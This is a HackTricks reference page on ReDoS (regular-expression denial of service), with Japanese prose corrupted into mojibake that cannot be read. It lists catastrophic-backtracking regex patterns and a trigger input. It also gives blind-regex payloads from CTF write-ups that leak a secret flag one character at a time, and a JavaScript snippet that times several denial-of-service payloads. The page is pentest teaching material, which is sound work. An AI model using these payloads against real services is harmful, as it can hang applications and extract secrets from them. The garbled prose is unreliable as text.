# Regular expression Denial of Service - ReDoS

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>

# Regular Expression Denial of Service (ReDoS)

Regular Expression Denial of Service (ReDoS)ã¯ã€**æ­£è¦è¡¨ç¾ã®å®Ÿè£…ã®éåŠ¹ç‡æ€§ã‚’åˆ©ç”¨ã™ã‚‹**ã‚¿ã‚¤ãƒ—ã®Denial of Serviceæ”»æ’ƒã§ã™ã€‚ã»ã¨ã‚“ã©ã®æ­£è¦è¡¨ç¾ã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€**å…¥åŠ›ã‚µã‚¤ã‚ºã«å¯¾ã—ã¦ã—ã°ã—ã°æŒ‡æ•°é–¢æ•°çš„ã«é–¢é€£ã™ã‚‹éå¸¸ã«é…ã„ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹**ã‚’ç¤ºã™æ¥µç«¯ãªçŠ¶æ³ã«é­é‡ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯æ­£è¦è¡¨ç¾ã‚’ä½¿ç”¨ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’é•·æ™‚é–“ãƒãƒ³ã‚°ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å•é¡Œã®ã‚ã‚‹æ­£è¦è¡¨ç¾ãƒŠã‚¤ãƒ¼ãƒ–ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ 

**è©³ç´°ã¯[https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**


## Evil Regexes <a href="#evil-regexes" id="evil-regexes"></a>

Evilãªæ­£è¦è¡¨ç¾ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨ã¯ã€**ç‰¹åˆ¥ã«ä½œã‚‰ã‚ŒãŸå…¥åŠ›ã§ã‚¹ã‚¿ãƒƒã‚¯ã™ã‚‹**ã‚‚ã®ã‚’æŒ‡ã—ã¾ã™ã€‚Evilãªæ­£è¦è¡¨ç¾ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ã¯é€šå¸¸ã€ç¹°ã‚Šè¿”ã—ã‚’ä¼´ã†ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã¨ã€ç¹°ã‚Šè¿”ã•ã‚Œã‚‹ã‚°ãƒ«ãƒ¼ãƒ—å†…ã§ã®é‡è¤‡ã¾ãŸã¯é¸æŠãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚Evilãªãƒ‘ã‚¿ãƒ¼ãƒ³ã®ä¾‹ã«ã¯ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} for x > 10

ä¸Šè¨˜ã®ã™ã¹ã¦ã¯ã€å…¥åŠ›`aaaaaaaaaaaaaaaaaaaaaaaa!`ã«å¯¾ã—ã¦è„†å¼±ã§ã™ï¼ˆä½¿ç”¨ã™ã‚‹ãƒã‚·ãƒ³ã®é€Ÿåº¦ã«ã‚ˆã£ã¦ã€æœ€å°å…¥åŠ›é•·ãŒã‚ãšã‹ã«å¤‰ã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

## ReDoS Payloads

### String Exfiltration via ReDoS

CTFï¼ˆã¾ãŸã¯ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ï¼‰ã§ã¯ã€**æ©Ÿå¯†æƒ…å ±ï¼ˆãƒ•ãƒ©ã‚°ï¼‰ãŒä¸€è‡´ã™ã‚‹Regexã‚’åˆ¶å¾¡ã™ã‚‹**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€**RegexãŒä¸€è‡´ã—ãŸå ´åˆã¯ãƒšãƒ¼ã‚¸ã‚’ãƒ•ãƒªãƒ¼ã‚ºã•ã›ã‚‹ï¼ˆã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¾ãŸã¯å‡¦ç†æ™‚é–“ã‚’é•·ãã™ã‚‹ï¼‰**ã“ã¨ãŒæœ‰ç”¨ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚**ä¸€è‡´ã—ãªã‹ã£ãŸå ´åˆã¯ãã†ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚**ã“ã®æ–¹æ³•ã§ã€æ–‡å­—ã”ã¨ã«**æ–‡å­—åˆ—ã‚’æŠ½å‡ºã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™:

* [**ã“ã®æŠ•ç¨¿**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ã§ã¯ã€ã“ã®ReDoSãƒ«ãƒ¼ãƒ«ãŒè¦‹ã¤ã‹ã‚Šã¾ã™: `^(?=<flag>)((.*)*)*salt$`
* ä¾‹: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ã§ã¯ã€ã“ã‚ŒãŒè¦‹ã¤ã‹ã‚Šã¾ã™:`<flag>(((((((.*)*)*)*)*)*)*)!`
* [**ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://ctftime.org/writeup/25869)ã§ã¯ã€å½¼ã¯ã“ã‚Œã‚’ä½¿ç”¨ã—ã¾ã—ãŸ: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS Controlling Input and Regex

ä»¥ä¸‹ã¯ã€**å…¥åŠ›**ã¨**regex**ã®ä¸¡æ–¹ã‚’**åˆ¶å¾¡ã™ã‚‹**ReDoSã®ä¾‹ã§ã™:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## ãƒ„ãƒ¼ãƒ«

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

# å‚è€ƒæ–‡çŒ®
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
